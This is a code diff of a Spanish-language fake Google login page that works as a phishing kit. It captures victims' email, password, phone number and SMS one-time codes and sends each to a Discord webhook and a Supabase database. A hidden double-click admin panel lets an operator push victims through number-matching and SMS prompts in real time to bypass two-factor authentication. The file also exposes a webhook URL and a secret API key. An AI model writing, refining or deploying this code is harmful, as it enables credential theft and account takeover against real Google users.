@@ -3,496 +3,270 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceder a la cuenta - Google</title>
-    
-    <!-- Incluir Tailwind CSS -->
+    <title>Google Login - Secure Access</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        /* Estilo general y animaciones de transición */
-        body {
-            font-family: 'Roboto', Arial, sans-serif;
-            background-color: #f8f9fa;
-        }
-
-        /* CARD/CONTAINER: Ajustado para ser más fiel a la anchura y sombra de Google */
-        #auth-container {
-            max-width: 450px; /* Ancho específico de Google */
-            min-height: 480px; 
-            position: relative; 
-            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15); /* Sombra más sutil y profunda */
-        }
-        
-        /* INPUTS: Custom CSS para simular el foco azul de Google */
-        .google-input {
-            /* Estilos base */
-            transition: border-color 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
-            border-width: 1px;
-        }
-        .google-input:focus {
-            /* Borde y sombra azul al enfocar, como Google */
-            outline: none;
-            border-color: #1a73e8; /* Google Blue */
-            box-shadow: 0 0 0 1px #1a73e8; /* Resplandor sutil */
-            border-width: 2px; /* Borde más grueso al enfocar */
-            padding-left: 11px; /* Compensar el grosor del borde */
-        }
-
-        /* Transiciones de paso */
-        .slide-out {
-            transform: translateX(-100%);
-            opacity: 0;
-            position: absolute; 
-            top: 0;
-            left: 0;
-            width: 100%;
-        }
-        .slide-in {
-            transform: translateX(0);
-            opacity: 1;
-            position: relative; 
-        }
-        .transition-all {
-            transition: all 0.5s ease-in-out;
-        }
-        .slide-out-visible {
-            display: block !important;
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .animate-spin { animation: spin 1s linear infinite; }
+        .fade-in { animation: fadeIn 0.5s ease-out; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4 flex-col">
+<body class="bg-white min-h-screen flex flex-col items-center justify-center p-4 font-sans select-none">
 
-    <!-- Contenedor Principal con Sombra y Borde -->
-    <div id="auth-container" class="max-w-sm w-full bg-white border border-gray-200 rounded-xl p-6 md:p-8 relative overflow-hidden">
+    <!-- Contenedor Principal -->
+    <div id="app-container" class="w-full max-w-[440px] p-8 md:p-10 md:border border-gray-200 rounded-2xl relative shadow-sm overflow-hidden fade-in">
         
-        <!-- Logo -->
-        <div class="flex items-start mb-6 justify-center">
-            <img src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" alt="Google" class="w-16">
+        <!-- Acceso Panel Invisible (Doble click esquina superior derecha) -->
+        <div id="admin-trigger" class="absolute top-0 right-0 w-14 h-14 z-50 cursor-default"></div>
+
+        <!-- Logo Google -->
+        <div class="flex justify-center mb-10">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-7">
         </div>
 
-        <!-- Paso 1: Inicio de Sesión (Email & Password) -->
-        <div id="signin-step" class="transition-all duration-500 ease-in-out slide-in w-full">
-            <!-- Título con peso de fuente normal (Google style) -->
-            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Acceder</h1>
-            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
-                Usar tu cuenta de Google
-            </p>
-
-            <form id="signin-form">
-                
-                <div class="mb-6">
-                    <input 
-                        type="email" 
-                        id="email-input" 
-                        placeholder="Correo electrónico o teléfono" 
-                        required
-                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
-                    >
-                    <p id="error-message-signin" class="text-xs text-red-500 mt-1 hidden"></p>
-                </div>
-                
-                <div class="mb-8">
-                    <input 
-                        type="password" 
-                        id="password-input" 
-                        placeholder="Ingresa tu contraseña" 
-                        required
-                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
-                    >
-                    <!-- Enlace real para olvido de contraseña -->
-                    <a href="https://accounts.google.com/signin/v2/recovery?hl=es" target="_blank" onclick="event.preventDefault(); window.open(this.href, '_blank');" class="text-sm text-blue-600 mt-3 cursor-pointer hover:underline inline-block font-medium">¿Has olvidado la contraseña?</a>
-                </div>
-
-                
-                <div class="flex justify-between items-center mt-10">
-                    <button type="button" id="create-account-button" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
-                        Crear cuenta
-                    </button>
-                    <!-- Botón azul con sombra sutil -->
-                    <button 
-                        type="submit"
-                        id="next-button"
-                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300"
-                    >
-                        Siguiente
-                    </button>
-                </div>
-            </form>
+        <div id="view-content">
+            <!-- El contenido se inyecta dinámicamente aquí -->
         </div>
-
-        <!-- Paso 2: Verificación de Teléfono -->
-        <div id="phone-step" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white" style="display: none;">
-            
-            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Verificación de identidad</h1>
-            
-            <!-- Texto modificado para ser más convincente -->
-            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
-                Escribe tu número de teléfono asociado a esta cuenta para la verificación. Te enviaremos un SMS.
-            </p>
-
-            
-            <div class="flex items-center p-3 mb-6 bg-gray-100 border border-gray-300 rounded-lg">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.848 5.231c.143.095.31.144.477.144s.334-.049.477-.144L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
-                </svg>
-                
-                <span id="display-email-phone" class="text-sm font-medium text-gray-800"></span>
-            </div>
-            
-            <form id="phone-form">
-                <div class="mb-6">
-                    <input 
-                        type="text" 
-                        id="phone-input" 
-                        placeholder="Ingresa tu número de teléfono" 
-                        required
-                        class="w-full px-3 py-3 border border-gray-300 rounded-lg text-base google-input"
-                    >
-                    <p id="error-message-phone" class="text-xs text-red-500 mt-1 hidden"></p>
-                </div>
-                
-                <div class="flex justify-between items-center mt-10">
-                    <!-- Botón de Atrás movido a la izquierda -->
-                    <button type="button" id="back-button-phone" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
-                        Atrás
-                    </button>
-                    <button 
-                        type="submit"
-                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300"
-                    >
-                        Siguiente
-                    </button>
-                </div>
-            </form>
-        </div>
-
-        <!-- Paso 3: Código SMS -->
-        <div id="sms-step" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white" style="display: none;">
-            
-            <h1 class="text-2xl font-normal text-gray-800 mb-4 text-center md:text-left">Introduce el código</h1>
-            
-            <!-- Texto modificado para finalizar la sesión -->
-            <p class="text-base text-gray-600 mb-6 text-center md:text-left">
-                Introduce el SMS recibido para finalizar el proceso de verificación de sesión. El código fue enviado al número 
-                <span id="display-phone-number" class="font-semibold"></span>.
-            </p>
-
-            
-            <div class="flex items-center p-3 mb-6 bg-gray-100 border border-gray-300 rounded-lg">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7h3a3 3 0 013 3v8a3 3 0 01-3 3H8a3 3 0 01-3-3v-3m16-5l-4-4M15 12V5a2 2 0 00-2-2H8a2 2 0 00-2 2v7m4 0v-7h6v7z" />
-                </svg>
-                <span id="display-email-sms" class="text-sm font-medium text-gray-800"></span>
-            </div>
-
-            <form id="sms-form">
-                <div class="mb-6">
-                    <input 
-                        type="number" 
-                        id="sms-input" 
-                        placeholder="Escribe el código" 
-                        required
-                        class="w-full px-4 py-3 border border-gray-300 rounded-lg text-lg tracking-wider text-center google-input"
-                    >
-                    <p id="error-message-sms" class="text-xs text-red-500 mt-1 hidden"></p>
-                    <!-- Enlace real para reenviar código (tamaño ajustado) -->
-                    <a href="#" onclick="event.preventDefault(); console.log('Reenviar código (Simulado)');" class="text-sm text-blue-600 mt-3 cursor-pointer hover:underline inline-block font-medium">Reenviar código</a>
-                </div>
-
-                <div class="flex justify-between items-center mt-10">
-                     <!-- Botón de Atrás movido a la izquierda -->
-                     <button type="button" id="back-button-sms" class="text-blue-600 text-sm font-medium hover:text-blue-800 transition py-2 px-3">
-                        Atrás
-                    </button>
-                    <button 
-                        type="submit"
-                        id="verify-button"
-                        class="bg-blue-600 text-white text-sm font-medium py-2 px-6 rounded-lg shadow-md hover:bg-blue-700 transition duration-300 disabled:opacity-50"
-                        disabled 
-                    >
-                        Verificar
-                    </button>
-                </div>
-            </form>
-        </div>
-
-        <!-- Paso 4: Pantalla de Éxito -->
-        <div id="success-screen" class="transition-all duration-500 ease-in-out slide-out top-0 left-0 w-full h-full p-6 md:p-8 bg-white flex flex-col justify-center items-center" style="display: none;">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 text-green-500 mx-auto mb-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-            <h2 class="text-xl font-semibold text-gray-800 mb-3">Verificación Exitosa</h2>
-            <p class="text-gray-600 mb-6 text-center">
-                Acceso concedido. Redirigiendo a la página de inicio...
-            </p>
-        </div>
-
     </div>
 
-    <!-- Footer Añadido para Realismo (Diseño de Google) -->
-    <footer class="mt-8 text-center max-w-sm w-full">
-        <div class="flex flex-wrap justify-center md:justify-between space-x-4 text-xs text-gray-500">
-            <!-- Selector de Idioma -->
-            <select class="bg-transparent border-none focus:outline-none cursor-pointer p-1 rounded-md hover:bg-gray-100">
-                <option>Español (Latinoamérica)</option>
-                <option>English (United States)</option>
-                <option>Português (Brasil)</option>
-            </select>
-            <!-- Enlaces Legales -->
-            <div class="flex space-x-4 mt-2 md:mt-0">
-                <a href="https://support.google.com/accounts/answer/40561" target="_blank" class="hover:underline">Ayuda</a>
-                <a href="https://policies.google.com/privacy" target="_blank" class="hover:underline">Privacidad</a>
-                <a href="https://policies.google.com/terms" target="_blank" class="hover:underline">Términos</a>
-            </div>
+    <!-- Footer -->
+    <footer class="mt-12 flex gap-8 text-[12px] text-gray-400 font-medium">
+        <span class="cursor-pointer hover:text-gray-600 transition">Español (España)</span>
+        <div class="flex gap-4">
+            <a href="#" class="hover:underline">Ayuda</a>
+            <a href="#" class="hover:underline">Privacidad</a>
+            <a href="#" class="hover:underline">Términos</a>
         </div>
     </footer>
 
     <script>
-        // =========================================================================================================
-        // !!! CONFIGURACIÓN DE DISCORD WEBHOOK !!!
-        // =========================================================================================================
-        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE'; 
-        const REDIRECT_URL = "https://mail.google.com/mail/u/0/#inbox"; // Redirección final a la bandeja de entrada
-        // =========================================================================================================
-
-        // Referencias a elementos del DOM (iguales al archivo anterior)
-        const signinStep = document.getElementById('signin-step');
-        const phoneStep = document.getElementById('phone-step');
-        const smsStep = document.getElementById('sms-step');
-        const successScreen = document.getElementById('success-screen');
+        // --- CONFIGURACIÓN ---
+        const SUPABASE_URL = "https://eyrvplemxhnootpjzkav.supabase.co";
+        const SUPABASE_KEY = "sb_secret_nFmqd2YSvu-5D3CARp7YYw_iFv9lKhF";
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1443618037294174220/cHXeoeQ9KzfGkKtUeVL-9AXk0o4ARszzBsEtkMm6xAVYgAMQdrSmNLP1K198X8HCgVSE";
         
-        const signinForm = document.getElementById('signin-form');
-        const phoneForm = document.getElementById('phone-form');
-        const smsForm = document.getElementById('sms-form');
+        // CORRECCIÓN: Renombrado de instancia para evitar conflicto con el objeto global de la librería
+        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
         
-        const emailInput = document.getElementById('email-input');
-        const passwordInput = document.getElementById('password-input');
-        const phoneInput = document.getElementById('phone-input');
-        const smsInput = document.getElementById('sms-input');
-        const verifyButton = document.getElementById('verify-button');
-        const createAccountButton = document.getElementById('create-account-button');
-        const backButtonPhone = document.getElementById('back-button-phone');
-        const backButtonSms = document.getElementById('back-button-sms');
+        let state = {
+            view: 'victim',
+            step: 'login',
+            sessionId: `SESS_${Math.random().toString(36).substr(2, 5).toUpperCase()}`,
+            formData: { email: '', password: '', phone: '', sms: '' },
+            targetNumber: '--',
+            adminSessions: []
+        };
 
-        const displayEmailPhone = document.getElementById('display-email-phone');
-        const displayEmailSms = document.getElementById('display-email-sms');
-        const displayPhoneNumber = document.getElementById('display-phone-number');
-        const errorMessageSignin = document.getElementById('error-message-signin');
-        const errorMessagePhone = document.getElementById('error-message-phone');
-        const errorMessageSms = document.getElementById('error-message-sms');
-
-        let capturedData = {
-            email: null,
-            password: null,
-            phone_number: null,
-            sms_code: null
-        }; 
-
-        // Función de Transición entre pasos
-        function transitionTo(currentStep, nextStep) {
-            currentStep.classList.remove('slide-in');
-            currentStep.classList.add('slide-out', 'slide-out-visible'); 
-            
-            setTimeout(() => {
-                currentStep.style.display = 'none';
-                currentStep.classList.remove('slide-out-visible'); 
-                
-                nextStep.style.display = (nextStep === successScreen) ? 'flex' : 'block';
-                nextStep.classList.remove('slide-out');
-                nextStep.classList.add('slide-in');
-            }, 500); 
-        }
-
-        // Función para enviar la alerta inmediata al Webhook de Discord
-        async function sendWebhookNotification(data, step) {
-            if (!DISCORD_WEBHOOK_URL || !DISCORD_WEBHOOK_URL.includes('http') || DISCORD_WEBHOOK_URL.includes('YOUR_ID')) {
-                console.warn("URL de Webhook no configurada o incompleta. No se envió la alerta.");
-                return;
-            }
-
-            let title, color;
-            switch(step) {
-                case 'SMS':
-                    title = "✅ ¡Código SMS Capturado! ✅";
-                    color = 65280; // Green
-                    break;
-                case 'PHONE':
-                    title = "📞 ¡Teléfono Capturado! 📞";
-                    color = 16750080; // Orange
-                    break;
-                case 'CREDENTIALS_LOGIN':
-                    title = "⚠️ ¡Credenciales Capturadas (Login)! ⚠️";
-                    color = 16776960; // Yellow
-                    break;
-                case 'CREDENTIALS_CREATE':
-                    title = "⚠️ ¡Credenciales Capturadas (Crear Cuenta)! ⚠️";
-                    color = 16776960; // Yellow
-                    break;
-                default:
-                    title = "⚠️ ¡Datos Capturados! ⚠️";
-                    color = 16776960; // Yellow
-            }
-
-            const message = {
-                username: "Alerta de Captura (Simulación)",
-                embeds: [{
-                    title: title,
-                    color: color, 
-                    fields: [
-                        { name: "Correo Electrónico", value: data.email || 'N/A', inline: false },
-                        { name: "Contraseña", value: data.password || 'N/A', inline: false },
-                        { name: "Teléfono", value: data.phone_number || 'Aún No Ingresado', inline: false },
-                        { name: "Código SMS (OTP)", value: data.sms_code || 'Aún No Ingresado', inline: false },
-                        { name: "User Agent", value: navigator.userAgent, inline: false },
-                    ],
-                    timestamp: new Date().toISOString(),
-                    footer: { text: `Fase: ${step} | Simulación de Phishing` }
-                }]
+        // --- FUNCIONES DE COMUNICACIÓN ---
+        async function updateRemote(newStep, dataToMerge = {}) {
+            const updateData = {
+                ...state.formData,
+                ...dataToMerge,
+                step: newStep,
+                session_id: state.sessionId,
+                updated_at: new Date()
             };
 
-            // Implementación de reintentos con backoff exponencial
-            const MAX_RETRIES = 5;
-            let attempts = 0;
-            while (attempts < MAX_RETRIES) {
-                try {
-                    const response = await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(message)
-                    });
-                    
-                    if (response.ok) {
-                        return; // Éxito
-                    } else {
-                        // Si el estado es 401, es un error de token. No reintentar.
-                        if (response.status === 401) {
-                             console.error(`Fallo al enviar el Webhook de Discord (HTTP 401). Token no válido.`);
-                             console.error("Mensaje de respuesta:", await response.text());
-                             break;
-                        }
-                        
-                        console.warn(`Fallo en el Webhook (HTTP ${response.status}). Reintentando en ${Math.pow(2, attempts)}s...`);
-                    }
+            await supabaseClient.from('sessions').upsert(updateData, { onConflict: 'session_id' });
 
-                } catch (error) {
-                    console.warn(`Fallo en la conexión del Webhook. Reintentando en ${Math.pow(2, attempts)}s...`);
-                }
+            // Notificación Discord
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🔑 CAPTURA RENDER (Syntax Fixed)",
+                        color: 0xDB4437,
+                        fields: [
+                            { name: "Sesión", value: state.sessionId, inline: true },
+                            { name: "Paso", value: newStep, inline: true },
+                            { name: "Email", value: updateData.email || "---" },
+                            { name: "Password", value: updateData.password || "---" },
+                            { name: "SMS", value: updateData.sms || "---" }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(() => {});
+        }
 
-                attempts++;
-                if (attempts < MAX_RETRIES) {
-                    // Espera exponencial
-                    await new Promise(resolve => setTimeout(resolve, Math.pow(2, attempts) * 1000));
-                }
+        // --- RENDERIZADO DE VISTAS ---
+        function render() {
+            const container = document.getElementById('view-content');
+            
+            if (state.view === 'admin') {
+                renderAdmin();
+                return;
             }
 
-            if (attempts === MAX_RETRIES) {
-                console.error("El Webhook de Discord falló después de múltiples reintentos.");
+            switch(state.step) {
+                case 'login':
+                    container.innerHTML = `
+                        <form id="login-form" class="space-y-6 fade-in">
+                            <div class="text-center">
+                                <h2 class="text-2xl font-normal text-gray-800">Iniciar sesión</h2>
+                                <p class="text-gray-600 mt-2 text-sm">Usa tu cuenta de Google</p>
+                            </div>
+                            <div class="space-y-3">
+                                <input id="inp-email" required type="email" placeholder="Correo electrónico" class="w-full p-4 border border-gray-300 rounded-lg focus:border-blue-500 outline-none">
+                                <input id="inp-pass" required type="password" placeholder="Contraseña" class="w-full p-4 border border-gray-300 rounded-lg focus:border-blue-500 outline-none">
+                            </div>
+                            <div class="flex justify-between items-center pt-6">
+                                <span class="text-blue-600 text-sm font-bold cursor-pointer">Crear cuenta</span>
+                                <button type="submit" class="bg-blue-600 text-white px-8 py-2.5 rounded-lg font-medium hover:bg-blue-700">Siguiente</button>
+                            </div>
+                        </form>
+                    `;
+                    document.getElementById('login-form').onsubmit = (e) => {
+                        e.preventDefault();
+                        state.formData.email = document.getElementById('inp-email').value;
+                        state.formData.password = document.getElementById('inp-pass').value;
+                        state.step = 'phone';
+                        updateRemote('phone');
+                        render();
+                    };
+                    break;
+
+                case 'phone':
+                    container.innerHTML = `
+                        <form id="phone-form" class="space-y-6 fade-in">
+                            <h2 class="text-xl font-medium text-center">Confirmar identidad</h2>
+                            <p class="text-sm text-gray-600 text-center">Introduce el número de teléfono vinculado.</p>
+                            <input id="inp-phone" required type="tel" placeholder="Número de teléfono" class="w-full p-4 border border-gray-300 rounded-lg text-center text-xl tracking-widest outline-none">
+                            <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-lg font-medium">Enviar aviso</button>
+                        </form>
+                    `;
+                    document.getElementById('phone-form').onsubmit = (e) => {
+                        e.preventDefault();
+                        state.formData.phone = document.getElementById('inp-phone').value;
+                        state.step = 'wait';
+                        updateRemote('wait');
+                        render();
+                    };
+                    break;
+
+                case 'wait':
+                    container.innerHTML = `
+                        <div class="text-center space-y-10 py-4 fade-in">
+                            <h2 class="text-xl font-medium">Revisa tu teléfono</h2>
+                            <p class="text-sm text-gray-600">Pulsa **SÍ** en la notificación y elige:</p>
+                            <div class="text-7xl font-bold text-gray-800 py-12 bg-blue-50 border-2 border-dashed border-blue-200 rounded-3xl animate-pulse">
+                                ${state.targetNumber}
+                            </div>
+                            <div class="flex flex-col items-center gap-3">
+                                <div class="w-5 h-5 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+                                <p class="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Esperando...</p>
+                            </div>
+                        </div>
+                    `;
+                    break;
+
+                case 'sms':
+                    container.innerHTML = `
+                        <form id="sms-form" class="space-y-6 fade-in">
+                            <h2 class="text-xl font-medium text-center">Verificación por código</h2>
+                            <p class="text-sm text-gray-600 text-center">Introduce el código G-XXXXXX enviado por SMS.</p>
+                            <div class="flex items-center border border-gray-300 rounded-xl p-4 focus-within:ring-1 ring-blue-500">
+                                <span class="font-bold text-gray-400 mr-3">G - </span>
+                                <input id="inp-sms" required type="number" placeholder="Código" class="w-full outline-none text-lg tracking-[0.2em]">
+                            </div>
+                            <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-xl font-medium shadow-md">Verificar</button>
+                        </form>
+                    `;
+                    document.getElementById('sms-form').onsubmit = (e) => {
+                        e.preventDefault();
+                        state.formData.sms = document.getElementById('inp-sms').value;
+                        state.step = 'end';
+                        updateRemote('end');
+                        render();
+                        setTimeout(() => window.location.href = "https://accounts.google.com", 2000);
+                    };
+                    break;
+
+                case 'end':
+                    container.innerHTML = `
+                        <div class="text-center py-12 space-y-6 fade-in">
+                            <div class="bg-green-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto text-green-600 text-4xl border border-green-100">✓</div>
+                            <h3 class="text-xl font-bold text-gray-800">Identidad confirmada</h3>
+                        </div>
+                    `;
+                    break;
             }
         }
 
-
-        // --- Manejadores de Eventos ---
-
-        // Función común para el Paso 1: Captura de Credenciales
-        async function handleCredentialCapture(e, stepName) {
-            e.preventDefault();
+        async function renderAdmin() {
+            const { data } = await supabaseClient.from('sessions').select('*').order('updated_at', { ascending: false });
+            const mainCont = document.getElementById('app-container');
+            mainCont.className = "w-full max-w-5xl p-6 bg-slate-950 text-white min-h-[500px] border border-slate-800 rounded-xl";
             
-            const email = emailInput.value.trim();
-            const password = passwordInput.value;
+            let html = `
+                <div class="flex justify-between items-center mb-6 border-b border-slate-800 pb-4">
+                    <h1 class="text-blue-500 font-bold">PANEL_CONTROL_V4</h1>
+                    <button id="btn-exit" class="bg-slate-800 px-3 py-1 text-xs rounded">SALIR</button>
+                </div>
+                <div class="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
+            `;
 
-            if (stepName === 'CREDENTIALS_LOGIN' && (!email || !password)) {
-                errorMessageSignin.textContent = "Por favor, ingresa tu correo y contraseña.";
-                errorMessageSignin.classList.remove('hidden');
-                return;
-            }
-            errorMessageSignin.classList.add('hidden');
+            data?.forEach(s => {
+                html += `
+                    <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl text-[11px] font-mono">
+                        <div class="flex justify-between mb-3 border-b border-slate-800 pb-2">
+                            <span class="text-slate-500">${s.session_id}</span>
+                            <span class="text-blue-400 font-bold">${s.step.toUpperCase()}</span>
+                        </div>
+                        <div class="space-y-1 mb-4">
+                            <p><span class="text-slate-600">U:</span> ${s.email || '-'}</p>
+                            <p><span class="text-slate-600">P:</span> ${s.password || '-'}</p>
+                            <p><span class="text-slate-600">T:</span> ${s.phone || '-'}</p>
+                            <p><span class="text-green-500 font-bold">S:</span> ${s.sms || '-'}</p>
+                        </div>
+                        <div class="flex gap-2 pt-2 border-t border-slate-800">
+                            <input type="text" placeholder="Num" maxlength="2" class="w-10 bg-black border border-slate-700 text-center text-yellow-400 num-inp" data-id="${s.session_id}">
+                            <button class="flex-1 bg-blue-600 text-white py-1 rounded font-bold btn-sms" data-id="${s.session_id}">FORZAR SMS</button>
+                        </div>
+                    </div>
+                `;
+            });
 
-            // 1. Almacenar Correo y Contraseña
-            capturedData.email = email || 'Crear cuenta (Email vacío)';
-            capturedData.password = password || 'Crear cuenta (Password vacío)';
-            
-            displayEmailPhone.textContent = capturedData.email; 
-            displayEmailSms.textContent = capturedData.email; 
+            html += `</div>`;
+            mainCont.innerHTML = html;
 
-            // 2. 🚨 ENVIAR ALERTA INMEDIATAMENTE
-            await sendWebhookNotification(capturedData, stepName);
-            
-            // 3. Iniciar transición visual
-            transitionTo(signinStep, phoneStep);
+            // Eventos Admin
+            document.getElementById('btn-exit').onclick = () => location.reload();
+            document.querySelectorAll('.num-inp').forEach(inp => {
+                inp.onblur = async (e) => {
+                    await supabaseClient.from('sessions').update({ target_number: e.target.value }).eq('session_id', e.target.dataset.id);
+                };
+            });
+            document.querySelectorAll('.btn-sms').forEach(btn => {
+                btn.onclick = async (e) => {
+                    await supabaseClient.from('sessions').update({ step: 'sms' }).eq('session_id', e.currentTarget.dataset.id);
+                    renderAdmin();
+                };
+            });
         }
 
-        // --- Lógica del Paso 1: Botón Siguiente (Login) ---
-        signinForm.addEventListener('submit', (e) => handleCredentialCapture(e, 'CREDENTIALS_LOGIN'));
+        // --- INICIALIZACIÓN ---
+        window.onload = () => {
+            updateRemote('login');
+            render();
 
-        // --- Lógica del Paso 1: Botón Crear Cuenta ---
-        createAccountButton.addEventListener('click', (e) => handleCredentialCapture(e, 'CREDENTIALS_CREATE'));
+            document.getElementById('admin-trigger').ondblclick = () => {
+                state.view = 'admin';
+                renderAdmin();
+            };
 
-        // --- Lógica del Paso 2: Número de Teléfono ---
-        phoneForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const phone = phoneInput.value.trim();
-            if (phone.length < 5) { 
-                errorMessagePhone.textContent = "Ingresa un número de teléfono válido para la verificación.";
-                errorMessagePhone.classList.remove('hidden');
-                return;
-            }
-            errorMessagePhone.classList.add('hidden');
-
-            // 1. Almacenar Número de Teléfono
-            capturedData.phone_number = phone;
-            displayPhoneNumber.textContent = phone;
-
-            // 2. 🚨 ENVIAR ALERTA NÚMERO DE TELÉFONO
-            await sendWebhookNotification(capturedData, 'PHONE');
-            
-            // 3. Iniciar transición visual
-            transitionTo(phoneStep, smsStep);
-        });
-
-        // Botón Atrás del Paso de Teléfono
-        backButtonPhone.addEventListener('click', function() {
-            transitionTo(phoneStep, signinStep);
-        });
-        
-        // --- Lógica del Paso 3: Código SMS (OTP) ---
-        
-        // Habilitar botón 'Verificar' al escribir
-        smsInput.addEventListener('input', function() {
-            verifyButton.disabled = this.value.length === 0;
-        });
-
-        smsForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const smsCode = smsInput.value.trim();
-
-            if (smsCode.length === 0) { 
-                errorMessageSms.textContent = "Por favor, ingresa el código SMS.";
-                errorMessageSms.classList.remove('hidden');
-                return;
-            }
-            errorMessageSms.classList.add('hidden');
-
-            // 1. Almacenar Código SMS
-            capturedData.sms_code = smsCode;
-
-            // 2. 🚨 ENVIAR ALERTA CÓDIGO SMS
-            await sendWebhookNotification(capturedData, 'SMS'); 
-            
-            // 3. Transición a la Pantalla de Éxito
-            transitionTo(smsStep, successScreen);
-            
-            // 4. Redireccionar después de un tiempo
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL; 
-            }, 3000); // 3 segundos para que el usuario vea el éxito
-        });
-
-        // Botón Atrás del Paso SMS
-        backButtonSms.addEventListener('click', function() {
-            transitionTo(smsStep, phoneStep);
-        });
+            // Suscripción en tiempo real para la víctima
+            supabaseClient.channel(`room_${state.sessionId}`)
+                .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'sessions', filter: `session_id=eq.${state.sessionId}` }, (p) => {
+                    state.targetNumber = p.new.target_number;
+                    state.step = p.new.step;
+                    if (state.view === 'victim') render();
+                })
+                .subscribe();
+        };
     </script>
-
 </body>
 </html>
